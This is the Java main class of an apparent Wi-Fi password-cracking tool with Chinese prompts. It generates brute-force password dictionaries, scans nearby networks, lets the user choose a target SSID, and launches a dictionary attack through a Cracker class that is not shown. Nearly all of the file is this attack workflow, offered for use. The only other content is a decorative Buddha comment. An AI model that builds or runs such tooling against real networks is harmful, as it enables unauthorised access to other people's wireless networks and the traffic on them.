package pers.afei.wificracker;

import java.io.File;
import java.util.Vector;
import java.util.Scanner;

import pers.afei.cmd.Command;
import pers.afei.utils.CmdExecer;
import pers.afei.utils.Util;

/************************************************************
 *                    _ooOoo_
 *                   o8888888o
 *                   88" . "88
 *                   (| -_- |)
 *                   O\  =  /O
 *               ____/`---'\____
 *             .'  \\|     |//  `.
 *            /  \\|||  :  |||//  \
 *           /  _||||| -:- |||||-  \
 *           |   | \\\  -   * |   |
 *           | \_|  ''\---/''  |   |
 *           \  .-\__  `-`  ___/-. /
 *         ___`. .'  /--.--\  `. . __
 *      ."" '<  `.___\_<|>_/___.'  >'"".
 *     | | :  `- \`.;`\ _ /`;.`/ - ` : | |
 *     \  \ `-.   \_ __\ /__ _/   .-` /  /
 *======`-.____`-.___\_____/___.-`____.-'======
 *                   `=---='
 *^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
 *
 *         佛祖保佑       永无BUG
 *
 *  本程序已经经过开光处理，绝无可能再产生bug
 **************************************************************/
public class App 
{
    public static void main( String[] args )
    {
        Scanner sc = new Scanner(System.in);

        System.out.println("输入1或2选择操作：\n1.生成新的字典;\n2.破解wifi密码\n");
        int op = sc.nextInt();

        if(op != 1 && op != 2) {
            
            System.out.println("输入不符合要求，重新输入");
        } else if(op == 1) {
            
            System.out.println("以字符串形式输入密码所含的字符集(字符之间不包含空格)");
            String charSet = sc.next();

            System.out.println("输入密码长度(至少为8)");
            int length = sc.nextInt();

            while(length < 8) {
                System.out.println("密码长度不能小于8, 重新输入");
                length = sc.nextInt();
            }

            System.out.println("输入字典名");
            String dicName = sc.next();

            File file = new File(new File("").getAbsolutePath() + "//dictionary//" + dicName + ".txt");
            while(file.exists()) {
                System.out.println("字典名重复，请重新输入字典名");
                dicName = sc.next();
                file = new File(new File("").getAbsolutePath() + "//dictionary//" + dicName + ".txt");
            }

            DicGenerator generator = new DicGenerator(charSet, length, dicName);
            
            System.out.println("开始生成字典，字符集大小和密码长度过大可能会需要很久很久，请等待。。。。。。");
            generator.generator();
            System.out.println("字典生成完成~~~");

        } else {
            CmdExecer cmdExecer = new CmdExecer();
            
            Vector<String> ssids = new Vector<>();
            Vector<String> signalStrength = new Vector<>();

            String ssid = null;
            String dic = null;
            String dicFolder = new File("").getAbsolutePath() + "//dictionary";
            
            Vector<String> vStrings = cmdExecer.exec(Command.SHOW_NETWORKS);

            for(String line: vStrings) {
                if(line.contains("SSID") && !line.contains("BSSID")) {
                    String temp = line.substring(line.indexOf(":", 0)+2, line.length());
                    if(Util.isHex(temp)) {
                        temp = Util.hexToString(temp);
                    }
                    ssids.add(temp);
                }
                if(line.contains("信号")) {
                    signalStrength.add(line.substring(line.indexOf(":", 0)+2, line.length()));
                }
            }

            System.out.println("请输入WIFI编号,选择要破解的WIFI(建议选择信号强度高于50%的)");
            int length = Math.min(ssids.size(), signalStrength.size());
            for(int index = 0; index < length; ++ index){
                System.out.println((index+1) + ":" + ssids.get(index) + "(信号强度：" + signalStrength.get(index) + ")");
            }
            
            int index = sc.nextInt();
            while(index > length || index <= 0) {
                System.out.println("没有这个WIFI，请重新选择");
                index = sc.nextInt();
            }
            ssid = ssids.get(index-1);

            System.out.println("输入字典编号，选择字典");

            File dicFolderFile = new File(dicFolder);
            File[] dicFiles = dicFolderFile.listFiles();
            int cnt = 1;
            for(File file: dicFiles) {
                if(file.isFile()) {
                    System.out.println((cnt ++) + ":" + file.getName().replaceAll("[.][^.]+$", ""));
                }
            }

            index = sc.nextInt();
            while(index > cnt) {
                System.out.println("没有这个字典，请重新选择");
                index = sc.nextInt();
            }
            dic = dicFiles[index-1].getAbsolutePath();

            int timeout = 1000;
            System.out.println("请输入连接超时时间,单位毫秒(不超过10000的自然数, 0表示默认值1000)");
        
            timeout = sc.nextInt();
            while(timeout < 0 || timeout > 10000) {
                System.out.println("超时时间不满足条件，应该是不超过10000的自然数");
                timeout = sc.nextInt();
            }

            if(timeout == 0) {
                timeout = 1000;
            }

            System.out.println("WIFI:" + ssid + "   字典:" + dicFiles[index-1].getName().replaceAll("[.][^.]+$", "") + "\n开始破解");
            
            long start = System.currentTimeMillis();

            Cracker cracker = new Cracker();
            cracker.violentCrack(ssid, dic, timeout);

            long end = System.currentTimeMillis();

            System.out.println("消耗时间：" + (end-start)/1000.0 + "s");

            sc.close();
        }

    }
}
